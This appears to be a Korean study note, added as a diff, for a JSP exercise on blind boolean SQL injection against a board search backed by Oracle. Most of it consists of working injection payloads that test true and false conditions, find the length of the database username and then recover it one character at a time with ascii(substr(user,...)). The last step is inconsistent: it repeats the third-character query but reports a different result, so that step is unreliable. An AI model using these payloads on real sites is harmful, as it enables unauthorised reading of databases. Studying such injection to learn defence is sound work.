@@ -1,0 +1,65 @@
+JSP 문제 4번
+
+
+select 컬럼 ...from 게시판  where 제목 like '%puppy%' and '1%' = '%1'
+
+검색어
+참 : puppy%' and '1%' = '1
+거짓 : puppy%' and '1%' = '2
+
+ SUBSTR("문자열", "시작위치", "길이")
+
+puppy%' and (공격쿼리) and '1%' = '1
+
+유저명
+select user from dual
+
+1) 유저명의 길이 4글자
+(select length(user) from dual) > 0
+
+puppy%' and ((select length(user) from dual)  = > 2) and '1%' = '1
+                                                         ~~~이 부분을 바꿔서 4인걸 유추
+
+2) 유저명을 한 글자씩
+
+select user from dual
+(select  ascii(substr(user, 1-탈취한길이,1)) from dual ) > 숫자
+
+--첫번째 글자--
+puppy%' and (select  ascii(substr(user, 1,1)) from dual ) > 80 and '1%' = '1
+			         ~~~ 첫번째 부터, 한개만 검색
+
+(select  ascii(substr(user, 1,1)) from dual ) > 80 --> 없음
+
+(select  ascii(substr(user, 1,1)) from dual ) > 70 -> 존재
+
+(select  ascii(substr(user, 1,1)) from dual ) = 73 -> 첫번째 글자 존재
+
+chr(73) -> I
+
+--두번째 글자--
+
+puppy%' and (select  ascii(substr(user, 2,1)) from dual ) = 78 and '1%' = '1
+
+chr(78) -> N
+
+--세번째 글자--
+
+puppy%' and (select  ascii(substr(user, 3,1)) from dual ) = 70 and '1%' = '1
+
+chr(70) -> F
+
+
+--네번째 글자--
+
+puppy%' and (select  ascii(substr(user, 3,1)) from dual ) = 70 and '1%' = '1
+
+chr(54) -> 6
+
+
+
+
+
+
+
+
